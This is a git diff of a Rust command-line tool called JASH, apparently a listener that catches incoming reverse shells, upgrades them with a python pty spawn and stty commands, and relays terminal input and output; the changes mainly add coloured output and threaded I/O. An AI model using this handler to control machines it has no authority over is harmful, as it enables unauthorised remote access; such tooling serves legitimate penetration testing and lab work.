@@ -1,37 +1,39 @@
-//Keep IDE clean (Its a unfinished project YOUR GONNA HAVE UNUSED FUNC'S)
 #![allow(unused_imports)]
 #![allow(unused_variables)]
 #![allow(unused_mut)]
 #![allow(dead_code)]
 
 //To do stuff
+//Nice colouring/ pretty ui
 //Encryption
 //custom payloads
 //tabs (makes sessions more fluid)
 //sessions
-//nice colouring
-//Make some custom revshell scripts
-//
+
+use colored::Colorize;
 use std::env;
 use std::io::ErrorKind;
 use std::io::{self, Read, Write, stdout};
 use std::net::{TcpListener, TcpStream};
 use std::thread;
 use std::time::Duration;
-
+use termion::raw::IntoRawMode;
 // Banner printing
 fn banner(ip: &str, shell: &str) {
-    println!("{}", "=".repeat(12));
+    println!("{}", "=".repeat(30).bright_cyan().bold());
     println!("Connection to: {}", ip);
-    println!("Shell:  {}", shell);
-    println!("{}", "=".repeat(12));
+    println!("{}", "=".repeat(30).magenta().bold());
 }
 
 // Shell stabilize commands
-fn stablise_shell(mut stream: &TcpStream) {
+fn stabilise_shell(mut stream: &TcpStream) {
     let _ = stream.write_all(b"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n");
-    let _ = stream.write_all(b"export TERM=xterm\n");
-    let _ = stream.write_all(b"stty rows 40 columns 120\n");
+    let _ = stream.flush();
+    thread::sleep(Duration::from_millis(300));
+
+    let _ = stream.write_all(b"export TERM=xterm\nstty raw\nclear\n");
+    let _ = stream.flush();
+    thread::sleep(Duration::from_millis(200));
 }
 
 // Read all available data from stream with timeout and no hanging
@@ -70,58 +72,50 @@ fn read_available(mut stream: &TcpStream) -> io::Result<String> {
 }
 
 // Handle each client connection
+// Handle each client connection
 fn handle_clients(mut stream: TcpStream, addr: String) {
-    // Set timeout for initial shell type read
-    stream
-        .set_read_timeout(Some(Duration::from_secs(2)))
-        .unwrap();
-
-    // Attempt to get shell type
-    let _ = stream.write_all(b"echo $0\n");
-    let shell_type = match read_available(&stream) {
-        Ok(s) if !s.trim().is_empty() => s.trim().to_string(),
-        _ => "Unknown".to_string(),
-    };
-
-    banner(&addr, &shell_type);
-    stablise_shell(&stream);
-
+    let mut stdout = io::stdout().into_raw_mode().unwrap();
     let mut stdin = io::stdin();
-    let mut stdout = stdout();
 
-    loop {
-        print!("Shell> ");
-        stdout.flush().unwrap();
+    let mut stream_in = stream.try_clone().unwrap();
+    // Remove second clone to avoid reading from a different stream that breaks output
+    // let mut stream_out = stream.try_clone().unwrap();
 
-        let mut input = String::new();
-        if stdin.read_line(&mut input).is_err() {
-            println!("[!!] Failed to read input");
-            break;
+    let input_thread = thread::spawn(move || {
+        let mut buffer = [0u8; 1024];
+
+        loop {
+            match stdin.read(&mut buffer) {
+                Ok(0) => break, // EOF
+                Ok(n) => {
+                    if stream_in.write_all(&buffer[..n]).is_err() {
+                        break; // Stop on write error
+                    }
+                }
+                Err(_) => break, // Stop on read error
+            }
         }
+    });
 
-        if input.trim() == "exit" {
-            println!("[!!] Closing connection to > {}", addr);
-            break;
-        }
-
-        if stream.write_all(input.as_bytes()).is_err() {
-            println!("Connection closed by > {}", addr);
-            break;
-        }
-
-        match read_available(&stream) {
-            Ok(output) => {
-                if !output.is_empty() {
-                    print!("{}", output);
+    let output_thread = thread::spawn(move || {
+        let mut buffer = [0u8; 1024];
+        loop {
+            // Use the original stream here directly instead of cloned stream_out
+            match stream.read(&mut buffer) {
+                Ok(0) => break, // remote closed
+                Ok(n) => {
+                    if stdout.write_all(&buffer[..n]).is_err() {
+                        break;
+                    }
                     stdout.flush().unwrap();
                 }
-            }
-            Err(e) => {
-                println!("[!] Error reading from {}: {}", addr, e);
-                break;
+                Err(_) => break,
             }
         }
-    }
+    });
+
+    let _ = input_thread.join().unwrap();
+    let _ = output_thread.join().unwrap();
 }
 
 fn main() -> io::Result<()> {
@@ -135,7 +129,7 @@ fn main() -> io::Result<()> {
     if args.len() > 1 {
         match args[1].as_str() {
             "--version" | "-v" => {
-                println!("JASH v0.1.0 Anne");
+                println!("JASH v0.1.0 Galley");
                 return Ok(());
             }
             "--help" | "-h" => {
@@ -152,8 +146,12 @@ fn main() -> io::Result<()> {
     // Bind listener
     let bind_addr = format!("0.0.0.0:{}", port);
     let listener = TcpListener::bind(&bind_addr)?;
-    println!("listener started {}", bind_addr);
-
+    println!(
+        "{} {} {}",
+        "Listener".bright_magenta().bold(),
+        "started on...".bright_cyan().bold(),
+        port.bright_yellow().bold()
+    );
     for stream in listener.incoming() {
         match stream {
             Ok(stream) => {
@@ -162,7 +160,8 @@ fn main() -> io::Result<()> {
                     .map(|a| a.to_string())
                     .unwrap_or_else(|_| String::from("Unknown"));
                 println!("[*] Connection from > {} ", addr);
-
+                stabilise_shell(&stream);
+                println!("Press Enter to, enter the shell");
                 thread::spawn(move || {
                     handle_clients(stream, addr);
                 });
@@ -176,4 +175,4 @@ fn main() -> io::Result<()> {
 }
 
 // Copyright (c) 2025 MuteAvery
-// Licensed under the MIT License. See LICENSE file in the project root.
+// Licensed under the MIT License. See LICENSE file in the project root
